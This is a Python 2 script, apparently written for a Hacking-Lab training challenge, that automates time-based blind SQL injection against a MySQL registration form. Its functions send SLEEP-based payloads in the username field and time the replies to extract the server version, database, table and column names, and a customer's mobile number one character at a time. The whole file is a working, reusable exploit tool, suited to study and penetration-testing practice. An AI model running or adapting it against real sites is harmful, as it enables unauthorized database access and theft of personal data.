#!/usr/bin/python
# author      : @g0vandS, Govand Sinjari
# license           : MIT

print '*****************************************************************'
print 'TimeBased Blind SQL Injection for MySQL server, Version 1.0'
print 'By Govand Sinjari, 2013-12-30, San Diego, USA'
print 
print '0 Extracting SQL version'
print '1 Extracting CURRENT DATABASE USER character length'
print '2 Extracting CURRENT DATABASE NAME'
print '3 Extracting current DB Name'
print '4 Extracting numbers of DBs'
print '5 Extracting of name in DBs'
print '6 Extracting numbers of Tables in a specific DB'
print '7 Extracting of Table name in a specific DB'
print '8 Extracting numbers of Columns in a specific Tables'
print '9 Extracting of Columns name in a specific Table'
print '10 Extracting of column content'
print
print 'default will be option 0'
print


import urllib
import urllib2
from datetime import datetime
import sys

fx = open('result.log','a')


url = 'https://glocken.hacking-lab.com/12001/blindsql_case1/auth_blindsql1/register'
#url = 'http://govand.info/ip.php'

Hostx 	= 'glocken.hacking-lab.com'
UserAgentx = 'Mozilla/5.0 (compatible; Govandbot-py/1.0; MSIE 5.5; Windows NT)'
Acceptx	= 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
AcceptLanguagex = 'en-US,en\;q=0.5'
AcceptEncodingx = 'gzip, deflate'
Refererx = 'https://glocken.hacking-lab.com/12001/blindsql_case1/auth_blindsql1/register'
Connectionx = 'keep-alive'
ContentTypex = 'application/x-www-form-urlencoded'
ContentLengthx = 322


#sqlx = '\' OR SLEEP(4)=0 LIMIT 1-- '

#headers = { 'User-Agent' : UserAgentx, 'Accept' : Acceptx, 'Accept-Language' : AcceptLanguagex, 'Accept-Encoding' : AcceptEncodingx, 'Referer' : Refererx, 'Connection' : Connectionx, 'Content-Type' : ContentTypex, 'Content-Length' : ContentLengthx }

headers = { 'User-Agent' : UserAgentx, 'Content-Type' : ContentTypex }
originalURLx = 'https%3A%2F%2Fglocken.hacking-lab.com%2F12001%2Fblindsql_case1%2Fblindsql1%2Fcontroller%3Faction%3Dprofile'


sleepx = 4
myrangechar = range(97,123)
myrangecharnum = range(97,122)
myrangecharnum.append(95)
myrangecharnum.extend(range(48,59))

dbx = '"glocken_emil"'
tablex = '"customers"'


def reqsend(url, data, headers):	
	t1 = datetime.now()

	try:
		req = urllib2.Request (url, data, headers)
		result = urllib2.urlopen(req)

	except urllib2.HTTPError, e:
    		print 'HTTPError = ' + str(e.code)
		sys.exit()
	except urllib2.URLError, e:
    		print 'URLError = ' + str(e.reason)
		sys.exit()
	except:
		print 'Something went wrong!!'
		sys.exit()

	t2 = datetime.now()
	td = t2-t1
	#print result.read()
	return td.seconds

def postx(sqlx):
	values = {'action' : 'newPassword', 'originalURL' :  originalURLx, 'username' : sqlx }
	data = urllib.urlencode(values)
	return data	



##### 0 Extracting SQL version using Time base SQL Injection
def sqlver(a,b):
        sqlx = '\' OR IF((ORD(MID((VERSION()),%d,1))=%d),SLEEP(%d)=0,0) LIMIT 1-- ' % (a,b,sleepx)
	timex = reqsend(url, postx(sqlx), headers)
	return timex

def getsqlver():
	for x in range (1,5):
		for y in range (46,58):
			execx = sqlver(x,y)
			if execx > sleepx:
				print 'found: ', chr(y)
				outx = str(datetime.now()) + ' - found: ' + chr(y) +  '\r\n'
        			fx.write(outx)
				break
	return



##### 1 Extracting CURRENT DATABASE USER charecter length using Time base SQL Injection
def sql1(c):
        sqlx = '\' OR IF((CHAR_LENGTH(USER())=%d),SLEEP(%d)=0,0) LIMIT 1-- ' % (c,sleepx)
	timex = reqsend(url, postx(sqlx), headers)
        return timex

def getsql1():
        for x in range (1,18):
        	execx = sql1(x)
                if execx > sleepx:
                	print 'found: ', x
			outx = str(datetime.now()) + ' - found: ' + str(x) +  '\r\n'
                        fx.write(outx)
                        continue
        return


##### 2 Extrating CURRENT DATABASE NAME using Time base SQL Injection
def sql2(d):
        sqlx = '\' OR IF((CHAR_LENGTH(DATABASE())=%d),SLEEP(%d)=0,0) LIMIT 1-- ' % (d,sleepx)
	timex = reqsend(url, postx(sqlx), headers)
        return timex

def getsql2():
        for x in range (1,20):
                execx = sql2(x)
                if execx > sleepx:
                        print 'found: ', x
			outx = str(datetime.now()) + ' - found: ' + str(x) + '\r\n'
                        fx.write(outx)
                        break
        return



##### 3 Extracting current DB Name
def sql3(a,b):
        sqlx = '\' OR IF((ASCII(lower(substring((DATABASE()),%d,1)))=%d),SLEEP(%d)=0,0) LIMIT 1-- ' % (a,b,sleepx)
	timex = reqsend(url, postx(sqlx), headers)
        return timex

def getsql3():
        for x in range (1,7):
                for y in range (97,122):
                        execx = sql3(x,y)
                        if execx > sleepx:
                                print 'found: ', x , ' : ' , chr(y)
                                outx = str(datetime.now()) + ' - found: ' + str(x) + ' : ' + chr(y) + '\r\n'
                                fx.write(outx)
				break
        return


##### 4 Extracting numbers of DBs
def sql4(a):
        sqlx = '\' OR IF((SELECT COUNT(*) FROM information_schema.schemata)=%d,SLEEP(%d)=0,0) LIMIT 1-- ' % (a,sleepx)
	timex = reqsend(url, postx(sqlx), headers)
        return timex

def getsql4():
        for x in range (1,50):
                execx = sql4(x)
                if execx > sleepx:
                        print 'found: ', x
                        outx = str(datetime.now()) + ' - found: ' + str(x) + '\r\n'
                        fx.write(outx)
                        break

        return


##### 5 Extracting of name in DBs
def sql5(a,b,c):
	sqlx = '\' OR IF(((SELECT ASCII(lower(SUBSTRING(SCHEMA_NAME,%d,1))) FROM information_schema.SCHEMATA LIMIT %d,1)=%d),SLEEP(%d)=0,0) LIMIT 1-- ' % (b,a,c,sleepx)
	timex = reqsend(url, postx(sqlx), headers)
        return timex


def getsql5():
        for x in range (1,15):
		print "DB name: " + str(x)
		for y in range (1,16):
                	for z in myrangecharnum:
                        	execx = sql5(x,y,z)
                        	if execx > sleepx:
                                	print chr(z)
                                	outx = str(datetime.now()) + ' - found: ' + str(x) + ' , ' + str(y) + ':' + chr(z) +  '\r\n'
                                	fx.write(outx)
                                	break
			if z == 58:
				print "No more letters or numbers"
				break
        return



##### 6 Extracting numbers of Tables in a specific DB
def sql6(a):
        sqlx = '\' OR IF((SELECT COUNT(*) FROM information_schema.tables where table_schema=%s)=%d,SLEEP(%d)=0,0) LIMIT 1-- ' % (dbx,a,sleepx)
	#print sqlx
        timex = reqsend(url, postx(sqlx), headers)
        return timex

def getsql6():
        for x in range (1,50):
                execx = sql6(x)
                if execx > sleepx:
                        print 'found: ', x
                        outx = str(datetime.now()) + ' - found: ' + str(x) + '\r\n'
                        fx.write(outx)
                        break

        return



##### 7 Extracting of Table name in a specific DB
def sql7(a,b,c):
        sqlx = '\' OR IF(((SELECT ASCII(lower(SUBSTRING(TABLE_NAME,%d,1))) FROM information_schema.tables where table_schema=%s LIMIT %d,1)=%d),SLEEP(%d)=0,0) LIMIT 1-- ' % (b,dbx,a,c,sleepx)
	timex = reqsend(url, postx(sqlx), headers)
        return timex

def getsql7():
        for x in range (3,15):
                print "Table name: " + str(x)
                for y in range (1,16):
                        for z in myrangecharnum:
                                execx = sql7(x,y,z)
                                if execx > sleepx:
                                        print chr(z)
                                        outx = str(datetime.now()) + ' - ' + chr(z) +  '\r\n'
                                        fx.write(outx)
                                        break
                        if z == 58:
                                print "No more letters or numbers"
                                break
        return



##### 8 Extracting numbers of Columns in a specific Tables
def sql8(a):
        sqlx = '\' OR IF((SELECT COUNT(*) FROM information_schema.columns where table_name=%s)=%d, SLEEP(%d)=0,0) LIMIT 1-- ' % (tablex,a,sleepx)
        timex = reqsend(url, postx(sqlx), headers)
        return timex

def getsql8():
        for x in range (1,50):
                execx = sql8(x)
                if execx > sleepx:
                        print 'found: ', x
                        outx = str(datetime.now()) + ' - found: ' + str(x) + '\r\n'
                        fx.write(outx)
                        break

        return


##### 9 Extracting of Columns name in a specific Table
def sql9(a,b,c):
        sqlx = '\' OR IF(((SELECT ASCII(lower(SUBSTRING(COLUMN_NAME,%d,1))) FROM information_schema.columns where table_name=%s and table_schema=%s LIMIT %d,1)=%d),SLEEP(%d)=0,0) LIMIT 1-- ' % (b,tablex,dbx,a,c,sleepx)
	timex = reqsend(url, postx(sqlx), headers)
        return timex


def getsql9():
        for x in range (10,12):
                print "Column name: " + str(x)
		outx = str(datetime.now()) + ' - Column name: ' + str(x) +  '\r\n'
                fx.write(outx)
                for y in range (1,16):
                        for z in myrangecharnum:
                                execx = sql9(x,y,z)
                                if execx > sleepx:
                                        print chr(z)
                                        outx = str(datetime.now()) + ' - ' + chr(z) +  '\r\n'
                                        fx.write(outx)
                                        break
                        if z == 58:
                                print "No more letters or numbers"
                                break
        return



##### 10 Extracting of column content
def sql10(a,b,c):
	sqlx = '\' OR IF(((SELECT ascii(lower(SUBSTRING(mobile,%d,1))) FROM  %s.%s where name = "Sandra" LIMIT %d,1)=%d),SLEEP(%d)=0,0) LIMIT 1-- ' % (b,dbx.strip('""'),tablex.strip('""'),a,c,sleepx)
        timex = reqsend(url, postx(sqlx), headers)
        return timex

def getsql10():
        for x in range (0,12):
                print "Column name: " + str(x)
                outx = str(datetime.now()) + ' - Column name: ' + str(x) +  '\r\n'
                fx.write(outx)
                for y in range (1,16):
                        for z in range(48,59):
                                execx = sql10(x,y,z)
                                if execx > sleepx:
                                        print chr(z)
                                        outx = str(datetime.now()) + ' - ' + chr(z) +  '\r\n'
                                        fx.write(outx)
                                        break
                        if z == 58:
                                print "No more letters or numbers"
                                break
        return





if len(sys.argv) == 1:
	print 'Usage: '+ sys.argv[0]+ ' option'
	print 

	argx = '0'
else: 
	argx = sys.argv[1]

#print argx
print "Sleep seconds: ", sleepx


if argx == '0':
	print 'Extracting SQL version'
	outx = str(datetime.now()) + ' - Extracting SQL version\r\n'
	fx.write(outx)
	getsqlver()

if argx == '1':
	print 'Extracting current USER name length'
	outx = str(datetime.now()) + ' - Extracting current USER name length\r\n'
        fx.write(outx)
	getsql1()

if argx == '2':
	print 'Extracting current DB Name Lenght'
	outx = str(datetime.now()) + ' - Extracting DB Name Lenght\r\n'
        fx.write(outx)
	getsql2()


if argx == '3':
        print 'Extracting current DB Name'
	outx = str(datetime.now()) + ' - Extracting current DB Name\r\n'
        fx.write(outx)
	getsql3()


if argx == '4':
        print 'Extacting number of DBs'
        outx = str(datetime.now()) + ' - Extracting number of  DBs\r\n'
        fx.write(outx)
        getsql4()



if argx == '5':
        print 'Extracting name of DBs'
        outx = str(datetime.now()) + ' - Extracting name of DBs\r\n'
        fx.write(outx)
        getsql5()



if argx == '6':
        print 'Extacting number of Tables in a Database'
	print 'Database name: ' + dbx
        outx = str(datetime.now()) + ' - Extracting number of Tables in a Database\r\n'
        fx.write(outx)
        outx = str(datetime.now()) + ' - Database name: ' + dbx + '\r\n'
        fx.write(outx)
        getsql6()

        
if argx == '7':
        print 'Extacting Table name in a specific Database'
	print 'Database name: ' + dbx
        outx = str(datetime.now()) + ' - Extracting Table name in a specific Database\r\n'
        fx.write(outx)
        outx = str(datetime.now()) + ' - Database name: ' + dbx + '\r\n'
        fx.write(outx)
        getsql7()
        

if argx == '8':
        print 'Extacting number of Columns in a Tables'
        print 'Table name: ' + tablex
        outx = str(datetime.now()) + ' - Extracting number of Columns in a Tables\r\n'
        fx.write(outx)
        outx = str(datetime.now()) + ' - Table name: ' + tablex + '\r\n'
        fx.write(outx)
        getsql8()
     

if argx == '9':
        print 'Extacting Column content'
	print 'Database name: ' + dbx
        print 'Table name: ' + tablex
        outx = str(datetime.now()) + ' - Extracting Columns name in a Tables and DB\r\n'
        fx.write(outx)
        outx = str(datetime.now()) + ' - Database name: ' + dbx + '\r\n'
        fx.write(outx)
        outx = str(datetime.now()) + ' - Table name: ' + tablex + '\r\n'
        fx.write(outx)
        getsql9()


if argx == '10':
        print 'Extacting Column content'
        print 'Database name: ' + dbx 
        print 'Table name: ' + tablex
	print 'Column name: mobile'
        outx = str(datetime.now()) + ' - Extracting Columns name in a Tables and DB\r\n'
        fx.write(outx)
        outx = str(datetime.now()) + ' - Database name: ' + dbx + '\r\n'
        fx.write(outx)
        outx = str(datetime.now()) + ' - Table name: ' + tablex + '\r\n'
        fx.write(outx)
        getsql10()


print ''
print 'I am done here ;)'
